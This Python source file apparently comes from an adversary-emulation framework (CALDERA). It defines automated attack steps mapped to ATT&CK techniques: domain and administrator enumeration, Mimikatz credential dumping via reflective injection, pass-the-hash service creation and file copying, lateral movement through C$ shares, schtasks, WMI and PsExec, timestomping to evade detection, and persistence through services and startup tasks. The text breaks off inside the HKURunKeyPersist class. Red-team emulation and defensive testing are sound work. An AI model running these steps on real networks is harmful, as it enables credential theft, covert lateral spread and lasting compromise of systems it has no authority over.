import logging
from datetime import timedelta, datetime
import asyncio

from ..commands import net, schtasks, wmic, nbtstat, cmd, sc, reg, command, systeminfo, tasklist, xcopy, psexec
from ..commands.powershell import PSArg, PSFunction
from ..commands.mimikatz import MimikatzCommand, sekurlsa_logonpasswords, sekurlsa_pth, mimi_exit, privilege_debug
from .operation import Step, OPUser, OPDomain, OPFile, OPCredential, OPHost, OPRat, OPVar, OPShare, OPSchtask, \
    OPTimeDelta, OPPersistence, OPService, OPRegKey, OPProcess, OPOSVersion
from ..util import tz_utcnow
from ..commands.errors import *
from ..commands import parsers
from .operation import OperationWrapper, ObservedRat

log = logging.getLogger(__name__)


class GetDomain(Step):
    """
    Description:
        This step enumerates the domain a machine belongs to using nbtstat.
    Requirements:
        Requires the computer to be connected to a domain, and for a rat to be accessible.
    """
    attack_mapping = [('T1016', 'Discovery'), ('T1106', 'Execution')]
    display_name = "get_domain"
    summary = "Use nbtstat to get information about the Windows Domain"

    preconditions = [("rat", OPRat)]
    postconditions = [("domain_g", OPDomain)]

    preproperties = ["rat.host.fqdn"]
    postproperties = ["domain_g.windows_domain", "domain_g.dns_domain"]

    significant_parameters = []

    cddl = """
    Knowns:
        rat: OPRat[host[fqdn]]
    Effects:
        if not exist rat {
            forget rat
        } else {
            know rat[host[domain[windows_domain, dns_domain]]]
        }
    """

    @staticmethod
    def description():
        return "Enumerating the Windows and DNS information of this domain"

    @staticmethod
    async def action(operation, rat, domain_g):
        windows_domain = await operation.execute_shell_command(rat, *nbtstat.n())
        dns_domain = '.'.join(rat.host.fqdn.split('.')[1:])
        await domain_g({'windows_domain': windows_domain, 'dns_domain': dns_domain})
        return True


class GetComputers(Step):
    """
    Description:
        This step enumerates the machines and their operating systems belonging to a domain using PowerView.
    Requirements:
        Requires a connection to a responsive Active Directory server.
    """
    attack_mapping = [('T1086', 'Execution'), ('T1064', 'Defense Evasion'), ('T1064', 'Execution'), ('T1018', 'Discovery'), ('T1106', 'Execution')]
    display_name = "get_computers"
    summary = "Use PowerView to query the Active Directory server for a list of computers in the Domain"

    preconditions = [("rat", OPRat)]
    postconditions = [("host_g", OPHost),
                      ("os_version_g", OPOSVersion)]

    postproperties = ["host_g.fqdn", "host_g.os_version"]

    significant_parameters = []

    cddl = """
    Knowns:
        rat: OPRat
    Effects:
        if not exist rat {
            forget rat
        } else {
            know rat[host[domain[hosts[fqdn, os_version]]]]
        }   
    """

    @staticmethod
    def description():
        return "Enumerating all computers in the domain"

    @staticmethod
    async def action(operation: OperationWrapper, rat: ObservedRat, host_g, os_version_g):
        objects = await operation.execute_powershell(rat, 'powerview', PSFunction("Get-DomainComputer"),
                                                     parsers.powerview.getdomaincomputer)
        in_scope_fqdns = operation.filter_fqdns(objects.keys())

        # save fqdns & os versions
        for fqdn in in_scope_fqdns:
            os_version = await os_version_g({**objects[fqdn]['parsed_version_info']})
            await host_g({'fqdn': fqdn, 'os_version': os_version})

        return True


class GetAdmin(Step):
    """
    Description:
        This step enumerates the administrator accounts on a target domain connected machine using PowerView by
        querying the Windows Active Directory.
    Requirements:
        Requires a connection to a responsive Active Directory server.
    """
    attack_mapping = [('T1086', 'Execution'), ('T1069', 'Discovery'), ('T1087', 'Discovery'), ('T1064', 'Defense Evasion'), ('T1064', 'Execution'), ('T1106', 'Execution')]
    display_name = "get_admin"
    summary = "Use PowerView's Get-NetLocalGroup command to query the Active Directory server for administrators " \
              "on a specific computer"

    preconditions = [("rat", OPRat),
                     ("host", OPHost)]
    postconditions = [("domain_g", OPDomain),
                      ("user_g", OPUser({'$in': OPVar("host.admins")}))]

    postproperties = ["user_g.username", "user_g.is_group", "user_g.sid"]

    significant_parameters = ["host"]

    cddl = """
    Knowns:
        rat: OPRat
        host: OPHost
    Effects:
        if not exist rat {
            forget rat
        } elif rat.elevated == True {
            know host[domain[dns_domain]]
            know host[admins[username, is_group, sid, host, domain]]
        }
    """

    @staticmethod
    def description(host):
        return "Enumerating the Administrators group of {}".format(host.fqdn)

    @staticmethod
    async def action(operation, rat, host, domain_g, user_g):
        objects = await operation.execute_powershell(rat, "powerview", PSFunction('Get-NetLocalGroupMember',
                                                                                  PSArg('ComputerName', host.hostname)),
                                                     parsers.powerview.getnetlocalgroupmember)
        for parsed_user in objects:
            # find the user for this account
            user_dict = {'username': parsed_user['username'],
                         'is_group': parsed_user['is_group'],
                         'sid': parsed_user['sid']}

            if 'dns_domain' in parsed_user:
                domain = await domain_g({'dns_domain': parsed_user['dns_domain']})
                user_dict['domain'] = domain
            elif 'windows_domain' in parsed_user:
                domain = await domain_g({'windows_domain': parsed_user['windows_domain']})
                user_dict['domain'] = domain
            else:
                user_dict['host'] = host

            await user_g(user_dict)

        return True


class Credentials(Step):
    """
    Description:
        This step utilizes mimikatz to dump the credentials currently stored in memory on a target machine.
    Requirements:
        Requires administrative access to the target machine.
        *NOTE: In order for this action to be useful, the target machines must be seeded with credentials,
        and the appropriate registry keys must be set so that the credentials are held in memory.*
    """
    attack_mapping = [('T1003', 'Credential Access'), ('T1064', 'Defense Evasion'), ('T1064', 'Execution'), ('T1086', 'Execution'), ('T1106', 'Execution')]
    display_name = "get_creds"
    summary = "Use Mimikatz to dump credentials on a specific computer"

    value = 10
    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host")))]
    postconditions = [("domain_g", OPDomain),
                      ("credential_g", OPCredential),
                      ("host_g", OPHost),
                      ("user_g", OPUser)]

    # hacky hint: tells the planner to assume that the credentials are for a user that is local admin on a
    # new host, so that it finds this technique useful
    hints = [("user_g", OPUser({'$in': OPVar('host_g.admins'), "domain": OPVar("domain_g")})),
             ("credential_g", OPCredential({"user": OPVar("user_g")}))]

    preproperties = ["host.os_version.major_version"]

    # host_g.fqdn portproperty is a hack so that planner can use it to laterally move
    postproperties = ["credential_g.password", "user_g.username", "user_g.is_group", "domain_g.windows_domain",
                      "host_g.fqdn"]

    significant_parameters = ["host"]

    cddl = """
    Knowns:
        rat: OPRat[host]
    Effects:
        if not exist rat {
            forget rat
        } elif rat.elevated {
            for cred in rat.host.cached_creds {
                know cred[user[username, is_group, domain[windows_domain], host], password]
            }
        }
    """

    @staticmethod
    def description(host):
        return "Running mimikatz to dump credentials on {}".format(host.fqdn)

    @staticmethod
    async def action(operation, rat, host, domain_g, credential_g, user_g):
        mimikatz_command = MimikatzCommand(privilege_debug(), sekurlsa_logonpasswords(), mimi_exit())

        if host.os_version.major_version >= 10:
            # Pass compiled mimikatz.exe into Invoke-ReflectivePEInjection PowerSploit script.  This works on
            # windows 10 and patched older systems (KB3126593 / MS16-014 update installed)
            accounts = await operation.reflectively_execute_exe(rat, "mimi64-exe", mimikatz_command.command,
                                                                parsers.mimikatz.sekurlsa_logonpasswords_condensed)
        else:
            # Use Invoke-Mimikatz (trouble getting this working on Windows 10 as of 8/2017).
            accounts = await operation.execute_powershell(rat, "powerkatz",
                                                          PSFunction("Invoke-Mimikatz",
                                                                     PSArg("Command", mimikatz_command.command)),
                                                          parsers.mimikatz.sekurlsa_logonpasswords_condensed)

        for account in accounts:
            user_obj = {'username': account['Username'].lower(), 'is_group': False}
            credential_obj = {}
            if 'Password' in account:
                credential_obj['password'] = account['Password']

            if 'NTLM' in account:
                credential_obj["hash"] = account['NTLM']

            # if the domain is not the hostname, this is a Domain account
            if account['Domain'].lower() != host.hostname.lower():
                domain = await domain_g({'windows_domain': account['Domain'].lower()})
                user_obj['domain'] = domain
            else:
                user_obj['host'] = host

            credential_obj['found_on_host'] = host

            user = await user_g(user_obj)
            credential_obj['user'] = user
            await credential_g(credential_obj)

        return True


class PassTheHashSc(Step):
    """
    Description:
        This step is a modified version of Pass the Hash that starts a service by stealing elevated credentials
        and passing them into a command prompt.
    Requirements:
        This step uses the Pass the Hash technique to copy a file to a target machine using xcopy.
    """
    attack_mapping = [('T1050', 'Persistence'), ('T1075', 'Lateral Movement'), ('T1021', 'Lateral Movement'), ('T1035', 'Execution'), ('T1106', 'Execution')]
    display_name = "pass_the_hash_sc"
    summary = ("Creates a service by using mimikatz's \"Pass the Hash\" function to inject a command prompt with "
               "elevated credentials")

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("dest_host", OPHost),
                     ('rat_file', OPFile({'host': OPVar('dest_host')})),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    # service_g properties are intentionally omitted here to prevent the planner from thinking it is useful
    postconditions = [("service_g", OPService),
                      ("rat_g", OPRat({"host": OPVar("dest_host"), "elevated": True,
                                       "executable": OPVar("rat_file.path")}))]

    preproperties = ['cred.hash', 'user.username', 'domain.windows_domain', 'rat_file.path',
                     'rat.host.os_version.major_version']

    not_equal = [("dest_host", "rat.host")]

    deterministic = True

    @staticmethod
    def description(dest_host, user):
        return "Using pass the hash with sc.exe to create and start a service on {} as {}".format(dest_host.fqdn, user.username)

    @staticmethod
    async def action(operation, rat, dest_host, rat_file, cred, user, domain, service_g, rat_g):
        svcname = operation.adversary_artifactlist.get_service_word()

        remote_host = None
        if dest_host != rat.host:
            remote_host = dest_host.fqdn

        bin_path = rat_file.path

        create_command = MimikatzCommand(privilege_debug(),
                                         sekurlsa_pth(user=user.username, domain=domain.windows_domain,
                                                      ntlm=cred.hash, run=sc.create(bin_path, svcname, remote_host=remote_host)[0].command_line),
                                         mimi_exit())

        start_command = MimikatzCommand(privilege_debug(),
                                        sekurlsa_pth(user=user.username, domain=domain.windows_domain,
                                                     ntlm=cred.hash, run=sc.start(svcname, remote_host=remote_host)[0].command_line),
                                        mimi_exit())

        if rat.host.os_version.major_version >= 10:
            # Pass compiled mimikatz.exe into Invoke-ReflectivePEInjection PowerSploit script.  This works on
            # windows 10 and patched older systems (KB3126593 / MS16-014 update installed)
            await operation.reflectively_execute_exe(rat, "mimi64-exe", create_command.command,
                                                     parsers.mimikatz.sekurlsa_pth)

            await service_g({'name': svcname, 'bin_path': rat_file.path, 'host': dest_host})

            await operation.reflectively_execute_exe(rat, "mimi64-exe", start_command.command,
                                                     parsers.mimikatz.sekurlsa_pth)
        else:
            # Use Invoke-Mimikatz (trouble getting this working on Windows 10 as of 8/2017).
            await operation.execute_powershell(rat, "powerkatz",
                                               PSFunction('Invoke-Mimikatz',
                                                          PSArg("Command", create_command.command)),
                                               parsers.mimikatz.sekurlsa_pth)

            await service_g({'name': svcname, 'bin_path': rat_file.path, 'host': dest_host})

            await operation.execute_powershell(rat, "powerkatz",
                                               PSFunction('Invoke-Mimikatz',
                                                          PSArg("Command", start_command.command)),
                                               parsers.mimikatz.sekurlsa_pth)
        await rat_g()
        return True

    @staticmethod
    async def cleanup(cleaner, service_g):
        for service in service_g:
            await cleaner.delete(service)


class PassTheHashCopy(Step):
    """
    Description:
        This step uses the Pass the Hash technique to copy a file to a target machine using xcopy.
    Requirements:
        Requires administrative access, domain enumeration, and credentials for an administrator on the target
        machine (needs both administrator enumeration 'GetAdmin', and credential data 'Credentials').
    """
    attack_mapping = [('T1105', 'Lateral Movement'), ('T1075', 'Lateral Movement'), ('T1106', 'Execution')]
    display_name = "pass_the_hash_copy"
    summary = "Copy a file from a computer to another using a credential-injected command prompt"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ("host", OPHost(OPVar("rat.host"))),
                     ('dest_host', OPHost),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('domain', OPDomain(OPVar("user.domain")))]
    postconditions = [("file_g", OPFile({'host': OPVar("dest_host")}))]

    preproperties = ['rat.executable', 'dest_host.hostname', 'domain.windows_domain', 'cred.hash']

    not_equal = [('host', 'dest_host')]

    deterministic = True

    @staticmethod
    def description(host, dest_host):
        return "Using pass the hash to copy an implant from {} to {}".format(host.fqdn, dest_host.fqdn)

    @staticmethod
    async def action(operation, rat, user, host, dest_host, cred, domain, file_g):
        filepath = "\\" + operation.adversary_artifactlist.get_executable_word()
        # echo F | xcopy will automatically create missing directories
        final_command = "cmd.exe /c echo F | xcopy {0} \\\\{1}\\c${2}".format(rat.executable, dest_host.hostname, filepath)

        mimikatz_command = MimikatzCommand(privilege_debug(),
                                           sekurlsa_pth(user=user.username, domain=domain.windows_domain,
                                                        ntlm=cred.hash, run=final_command),
                                           mimi_exit())

        if host.os_version.major_version >= 10:
            # Pass compiled mimikatz.exe into Invoke-ReflectivePEInjection PowerSploit script.  This works on
            # windows 10 and patched older systems (KB3126593 / MS16-014 update installed)
            await operation.reflectively_execute_exe(rat, "mimi64-exe", mimikatz_command.command,
                                                     parsers.mimikatz.sekurlsa_pth)
        else:
            # Use Invoke-Mimikatz (trouble getting this working on Windows 10 as of 8/2017).
            await operation.execute_powershell(rat, "powerkatz",
                                               PSFunction('Invoke-Mimikatz',
                                                          PSArg("Command", mimikatz_command.command.command_line)),
                                               parsers.mimikatz.sekurlsa_pth)

        await file_g({'src_host': dest_host, 'src_path': rat.executable, 'path': "C:" + filepath, 'use_case': 'rat'})

        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)


class Timestomp(Step):
    """
    Description:
        This step adjusts the logged timestamps for a target file to match those of a similar file. The cleanup
        process restores the original timestamps for the file.
    Requirements:
        Requires administrative access on the target machine.
    """
    attack_mapping = [('T1099', 'Defense Evasion'), ('T1106', 'Execution')]
    display_name = "timestomp"
    summary = "Reduce suspicion of a copied file by altering its timestamp to look legitimate"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host"))),
                     ('file', OPFile({'host': OPVar('host')}))]

    postconditions = [("file_g", OPFile)]

    postproperties = ["file_g.new_creation_time", "file_g.new_last_access",
                      "file_g.new_last_write", "file_g.old_creation_time",
                      "file_g.old_last_access", "file_g.last_write",
                      "file_g.timestomped"]

    # Prevents the rat's timestamps from being altered (attempting to timestamp the rat produces an error)
    # Comment this next line out for testing
    not_equal = [('file.path', 'rat.executable')]

    @staticmethod
    def description(file, host):
        return "Modifying the timestamp of {} on {}".format(file.path, host.fqdn)

    @staticmethod
    async def action(operation, rat, host, file, file_g):
        results = await operation.execute_powershell(rat, "timestomper",
                                                     PSFunction('Perform-Timestomp', PSArg('FileLocation', file.path),
                                                                PSArg('Verbose')), parsers.timestomp.timestomp)

        # Unpack parser...
        if results["TimestampModified"] == "True":
            timestamp_modified = True
        else:
            timestamp_modified = False

        await file_g({'path': file.path,
                      'host': file.host,
                      'use_case': file.use_case,
                      'new_creation_time': results["CreationTime"],
                      'new_last_access': results["LastAccessTime"],
                      'new_last_write': results["LastWriteTime"],
                      'old_creation_time': results["OldCreationTime"],
                      'old_last_access': results["OldAccessTime"],
                      'old_last_write': results["OldWriteTime"],
                      'timestomped': timestamp_modified
                      })

        return True

    # Resets the timestamp of the file
    @staticmethod
    async def cleanup(cleaner, host, file_g):
        for file in file_g:
            try:
                await cleaner.revert_timestamp(host, file)
            except AttributeError:
                continue


class NetUse(Step):
    """
    Description:
        This step mounts a C$ network share on a target remote machine using net use. This can then be leveraged
        for a host of machine-to-machine techniques.
    Requirements:
        Requires administrative credentials for target machine ((needs both administrator enumeration 'GetAdmin',
        and credential data 'Credentials') and domain enumeration.
    """
    attack_mapping = [('T1077', 'Lateral Movement'), ('T1106', 'Execution')]
    display_name = "net_use"
    summary = "Mount a C$ network share using net use"

    # prevents net_use
    value = 0
    preconditions = [("rat", OPRat),
                     ('host', OPHost),
                     ("cred", OPCredential({'$in': {'user': OPVar("host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    postconditions = [('share_g', OPShare({"src_host": OPVar("rat.host"), "dest_host": OPVar("host"),
                                           'share_name': 'C$'}))]

    not_equal = [('host', 'rat.host')]

    preproperties = ['domain.windows_domain', 'cred.password', 'host.fqdn', 'user.username']
    postproperties = ["share_g.share_path", "share_g.mount_point"]

    deterministic = True

    cddl = """
    Knowns:
        rat: OPRat[host]
        host: OPHost[fqdn]
        cred: OPCredential[password, user[username, domain[windows_domain]]]
    Where:
        rat.host != host
    Effects:
        if not exist rat {
            forget rat
        } elif cred.user in host.admins {
            create OPShare[src_host=rat.host, dest_host=host, share_name="C$", share_path="whatever"]
        }
    """

    @staticmethod
    def description(rat, host):
        return "Mounting {}'s C$ network share on {} with net use".format(host.fqdn, rat.host.fqdn)

    @staticmethod
    async def action(operation, rat, host, cred, user, domain, share_g):
        await operation.execute_shell_command(rat, *net.use(host.fqdn, 'C$', user=user.username,
                                                            user_domain=domain.windows_domain, password=cred.password))
        await share_g({'share_path': '\\\\{}\\C$'.format(host.fqdn), 'mount_point': 'C:'})
        return True

    @staticmethod
    async def cleanup(cleaner, share_g):
        for share in share_g:
            await cleaner.delete(share)


class Copy(Step):
    """
    Description:
        This step copies a file, specifically the Caldera RAT, between machines.
    Requirements:
        Requires a share to have been created on the target machine, which is usually accomplished using NetUse.
    """
    attack_mapping = [('T1105', 'Lateral Movement'), ('T1106', 'Execution')]
    display_name = "copy_file"
    summary = "Copy a file from a computer to another using a mounted network share"

    preconditions = [("rat", OPRat),
                     ("share", OPShare({"src_host": OPVar("rat.host")}))]
    postconditions = [("file_g", OPFile({'host': OPVar("share.dest_host")}))]

    preproperties = ['rat.executable', 'share.share_path']

    postproperties = ['file_g.path']

    deterministic = True

    cddl = """
    Knowns:
        rat: OPRat[host, executable]
        share: OPShare[src_host, dest_host, share_path]
    Where:
        rat.host == share.src_host
        rat.host != share.dest_host
    Effects:
        if not exist rat {
            forget rat
        } else {
            create OPFile[path="somepath", host=share.dest_host]
        }
    """

    @staticmethod
    def description(rat, share):
        return "Copying an implant from {} to {}".format(rat.host.fqdn, share.dest_host.fqdn)

    @staticmethod
    async def action(operation, rat, share, file_g):
        filepath = "\\" + operation.adversary_artifactlist.get_executable_word()
        await operation.execute_shell_command(rat, *cmd.copy(rat.executable, share.share_path + filepath))
        await file_g({'src_host': share.src_host, 'src_path': rat.executable, 'path': share.mount_point + filepath,
                      'use_case': 'rat'})
        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)


class NetTime(Step):
    """
    Description:
        This step determines the current time on a target machine, using the 'net time' command.
    Requirements:
        This step has no hard requirements, but is necessary for several other steps, such as Schtasks.
    """
    attack_mapping = [('T1124', 'Discovery'), ('T1106', 'Execution')]
    display_name = "net_time"
    summary = 'Remotely enumerate host times using "net time"'

    preconditions = [("rat", OPRat),
                     ('host', OPHost)]

    postconditions = [('time_delta_g', OPTimeDelta({"host": OPVar("host")}))]

    preproperties = ["host.fqdn"]
    postproperties = ["time_delta_g.seconds", "time_delta_g.microseconds"]

    deterministic = True

    cddl = """
    Knowns:
        rat: OPRat
        host: OPHost
    Effects:
        if not exist rat {
            forget rat
        } else {
            know host[timedelta[seconds, microseconds]]
        }
    """

    @staticmethod
    def description(host):
        return "Determining the time on {}".format(host.fqdn)

    @staticmethod
    async def action(operation, rat, host, time_delta_g):
        d = await operation.execute_shell_command(rat, *net.time(host.fqdn))
        now = datetime.utcnow()
        delta = now - d
        await time_delta_g({'seconds': delta.seconds, 'microseconds': delta.microseconds})
        return True


class Schtasks(Step):
    """
    Description:
        This step schedules a task on a remote machine, with the intent of starting a previously copied RAT.
    Requirements:
        Requires a knowledge of the target machine's current time state (usually accomplished using NetTime),
        credentials for an administrator on the target machine (needs both administrator enumeration 'GetAdmin',
        and credential data 'Credentials'), domain enumeration, and access to a copy of the RAT on the target
        machine (usually accomplished using Copy or XCopy).
    """
    attack_mapping = [('T1053', 'Execution'), ('T1053', 'Privilege Escalation'), ('T1106', 'Execution')]
    display_name = "schtasks"
    summary = "Remotely schedule a task using schtasks"

    value = 20

    preconditions = [("rat", OPRat),
                     ('dest_host', OPHost),
                     ('time_delta', OPTimeDelta({"host": OPVar("dest_host")})),
                     ('rat_file', OPFile({'host': OPVar('dest_host')})),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    postconditions = [('schtask_g', OPSchtask({"host": OPVar("dest_host")})),
                      ("rat_g", OPRat({"host": OPVar("dest_host"), "elevated": True,
                                         "executable": OPVar("rat_file.path")}))]

    not_equal = [('dest_host', 'rat.host')]

    preproperties = ['domain.windows_domain']

    postproperties = ["schtask_g.name", 'schtask_g.exe_path', "schtask_g.arguments", "schtask_g.user",
                      "schtask_g.cred", "schtask_g.start_time"]

    deterministic = True

    @staticmethod
    def description(rat, dest_host):
        return "Scheduling a task to execute on {}".format(dest_host.fqdn)

    @staticmethod
    async def action(operation, rat, time_delta, dest_host, user, rat_file, cred, domain, schtask_g, rat_g):
        delta = timedelta(seconds=time_delta['seconds'],
                          microseconds=time_delta['microseconds'])

        task_name = 'caldera_task1'
        exe_path = rat_file.path
        arguments = '-d'

        t = tz_utcnow() - delta + timedelta(seconds=120)

        await operation.execute_shell_command(rat, *schtasks.create(task_name, exe_path, arguments=arguments,
                                                                    remote_host=dest_host.fqdn,
                                                                    user=user.username, user_domain=domain.windows_domain,
                                                                    password=cred.password, start_time=t,
                                                                    remote_user="SYSTEM"))

        await schtask_g({"name": task_name, 'exe_path': exe_path, "arguments": arguments, "user": user,
                         "cred": cred, "start_time": t})
        await rat_g()
        return True

    @staticmethod
    async def cleanup(cleaner, schtask_g):
        for schtask in schtask_g:
            await cleaner.delete(schtask)


class WMIRemoteProcessCreate(Step):
    """
    Description:
        This step starts a process on a remote machine, using the Windows Management Interface (wmic). This allows
        for lateral movement throughout the network.
    Requirements:
        Requires domain enumeration, access to a copy of the RAT on the target machine (usually accomplished using
        Copy or Xcopy), and credentials for an administrator on the target machine (needs both administrator enumeration
        'GetAdmin', and credential data 'Credentials').
    """
    attack_mapping = [('T1047', 'Execution'), ('T1078', 'Persistence'), ('T1078', 'Defense Evasion'), ('T1106', 'Execution')]
    display_name = "remote_process(WMI)"
    summary = "Use WMI to start a process on a remote computer"

    value = 20

    preconditions = [("rat", OPRat),
                     ('dest_host', OPHost),
                     ('rat_file', OPFile({'host': OPVar('dest_host')})),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    postconditions = [("rat_g", OPRat({"host": OPVar("dest_host"), "elevated": True,
                                         "executable": OPVar("rat_file.path")}))]

    not_equal = [('dest_host', 'rat.host')]

    preproperties = ['rat_file.path', 'domain.windows_domain', 'dest_host.fqdn', 'user.username', 'cred.password']

    deterministic = True

    cddl = """
    Knowns:
        rat: OPRat[host]
        dest_host: OPHost
        rat_file: OPFile[path, host]
        cred: OPCredential[user[domain[windows_domain]], password]
    Where:
        rat.host != dest_host
        rat_file.host == dest_host
    Effects:
        if not exist rat {
            forget rat
        } elif cred.user in dest_host.admins {
            create OPRat[host=dest_host, elevated=True, executable=rat_file.path]
        } 
"""

    @staticmethod
    def description(rat, dest_host):
        return "Starting a remote process on {} using WMI.".format(dest_host.fqdn)

    @staticmethod
    async def action(operation, rat, dest_host, user, rat_file, cred, domain, rat_g):
        await operation.execute_shell_command(rat, *wmic.create(rat_file.path, arguments='-d -f',
                                                                remote_host=dest_host.fqdn, user=user.username,
                                                                user_domain=domain.windows_domain,
                                                                password=cred.password))
        await rat_g()
        return True


class ScPersist(Step):
    """
    Description:
        Creates a service on a target machine in order to establish persistence, using sc.exe.
    Requirements:
        Requires an elevated RAT, and a accessible copy of the RAT on the target machine.
    """
    attack_mapping = [('T1050', 'Persistence'), ('T1050', 'Privilege Escalation'), ('T1106', 'Execution')]
    display_name = "sc_persist"
    summary = "Use sc.exe to achieve persistence by creating a service on compromised hosts"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host"))),
                     ('rat_file', OPFile({'host': OPVar('host')}))]

    postconditions = [("service_g", OPService({"host": OPVar("host")})),
                      ("persist_g", OPPersistence({"host": OPVar("host"), "elevated": True}))]

    significant_parameters = ['host']

    preproperties = ["rat_file.path"]

    postproperties = ["service_g.name", "persist_g.service_artifact", "service_g.bin_path"]

    @staticmethod
    def description(rat, host):
        return "Using sc.exe to create a service on {}".format(host.hostname)

    @staticmethod
    async def action(operation, rat, host, rat_file, service_g, persist_g):
        # svcname = "caldera"
        svcname = operation.adversary_artifactlist.get_service_word()
        bin_path = '"cmd /K start {}"'.format(rat_file.path)

        await operation.execute_shell_command(rat, *sc.create(bin_path, svcname))

        service = await service_g({'name': svcname, 'bin_path': bin_path})
        await persist_g({'service_artifact': service})

        return True

    @staticmethod
    async def cleanup(cleaner, service_g):
        for service in service_g:
            await cleaner.delete(service)


class PsexecMove(Step):
    """
    Description:
        This step utilizes the Windows Internals tool PsExec to spawn a RAT on a remote host, moving through
        the network via lateral movement.
    Requirements:
        Requires credentials for an administrator on the target machine (needs both administrator enumeration
        'GetAdmin', and credential data 'Credentials'), and an enumerated domain. In addition, PsExec must have
        been downloaded and integrated into Caldera in order for this step to execute correctly.
        PsExec can be acquired and integrated using the 'Load PsExec' option in Settings.
    """
    attack_mapping = [('T1035', 'Execution')]
    display_name = "psexec_move"
    summary = "Move laterally using psexec"

    preconditions = [("rat", OPRat),
                     ("dest_host", OPHost),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    not_equal = [('dest_host', 'rat.host')]

    preproperties = ['domain.windows_domain', 'user.username', 'cred.password', 'dest_host.hostname']

    # file_g properties are intentionally omitted here to prevent the planner from thinking it is useful
    postconditions = [("file_g", OPFile),
                      ("rat_g", OPRat({"host": OPVar("dest_host")}))]

    deterministic = True

    @staticmethod
    def description(rat, dest_host, cred, user, domain):
        return "Moving laterally to {} with {} via {} using psexec".format(dest_host.hostname, user.username,
                                                                           rat.host.hostname)

    @staticmethod
    async def action(operation, rat, dest_host, cred, user, domain, file_g, rat_g):
        ps_loc = "C:\\Users\\" + user.username + "\\mystery.exe"
        rat_loc = "C:\\Users\\" + user.username + "\\crater.exe"
        await operation.drop_file(rat, ps_loc, "../dep/tools/ps.hex")
        await operation.drop_file(rat, rat_loc, "../dep/crater/crater/cratermain.exe")
        await file_g({'path': ps_loc, 'host': rat.host, 'use_case': 'dropped'})
        await file_g({'path': rat_loc, 'host': rat.host, 'use_case': 'dropped'})
        await operation.execute_shell_command(rat, *psexec.copy(ps_loc, rat_loc, domain.windows_domain, user.username,
                                                                cred.password, dest_host.hostname))
        await rat_g()
        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)


class SchtasksPersist(Step):
    """
    Description:
        This step involves scheduling a startup task on a target machine with the goal of maintaining persistence.
        Any RATs spawn via this method run as SYSTEM.
    Requirements:
        Requires an Elevated RAT, and a accessible copy of the RAT on the target machine.
    """
    attack_mapping = [('T1053', 'Persistence'), ('T1106', 'Execution')]
    display_name = "schtasks_persist"
    summary = "Schedule a startup task to gain persistence using schtask.exe"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host"))),
                     ("rat_file", OPFile({"host": OPVar("host")}))]

    postconditions =[("schtask_g", OPSchtask({"host": OPVar("host"), "schedule_type": "onstart"})),
                     ("persist_g", OPPersistence({"host": OPVar("host"), "elevated": True}))]

    significant_parameters = ['host']

    preproperties = ["rat_file.path"]
    postproperties = ["persist_g.schtasks_artifact",
                      "schtask_g.name", "schtask_g.exe_path"]

    @staticmethod
    def description(rat):
        return "Gaining persistence on {} by scheduling a startup task.".format(rat.host.hostname)

    @staticmethod
    async def action(operation, rat, host, rat_file, schtask_g, persist_g):
        task_name = operation.adversary_artifactlist.get_scheduled_task_word()
        exe_path = rat_file.path
        arguments = ""

        await operation.execute_shell_command(rat, *schtasks.create(task_name=task_name, arguments=arguments,
                                                                    exe_path=exe_path,
                                                                    remote_user="SYSTEM", schedule_type="ONSTART"))

        schtask = await schtask_g({"name": task_name, "exe_path": exe_path, "arguments": arguments})
        await persist_g({"schtasks_artifact": schtask})

        return True

    @staticmethod
    async def cleanup(cleaner, schtask_g):
        for schtask in schtask_g:
            await cleaner.delete(schtask)


class GetLocalProfiles(Step):
    """
    Description:
        This step enumerates the local profiles of a target machine by enumerating the registry using reg.exe.
    Requirements:
        This step has no hard requirements, but is necessary for another action, HKURunKeyPersist.
    """
    attack_mapping = [('T1012', 'Discovery'), ('T1033', 'Discovery'), ('T1106', 'Execution')]
    display_name = "get_local_profiles"
    summary = "Use reg.exe to enumerate user profiles that exist on a local machine"

    preconditions = [("rat", OPRat),
                     ("host", OPHost(OPVar("rat.host")))]
    postconditions = [("user_g", OPUser({'$in': OPVar("host.local_profiles")}))]

    significant_parameters = ["host"]

    postproperties = ["user_g.username", "user_g.sid", "user_g.is_group"]

    @staticmethod
    def description(rat, host):
        return "Enumerating user profiles on {}".format(rat.host.hostname)

    @staticmethod
    async def action(operation, rat, host, user_g):
        # Enumerate Local Profiles
        profile_list_loc = '"HKLM\\software\\microsoft\\windows nt\\currentversion\\profilelist"'

        q = await operation.execute_shell_command(rat, *reg.query(key=profile_list_loc, switches=["/s"]))

        profile_keys = [x for x in q.keys() if "S-1-5-21" in x]
        for key in profile_keys:
            sid = key[key.rfind("\\")+1:]  # The SID is at the end of the key
            profile_path = q[key]['ProfileImagePath'].data
            username = profile_path[profile_path.rfind('\\')+1:]  # Assume that directory name is the username.
            await user_g({'username': username, 'sid': sid, 'is_group': False})

        return True


class HKURunKeyPersist(Step):
    """
    Description:
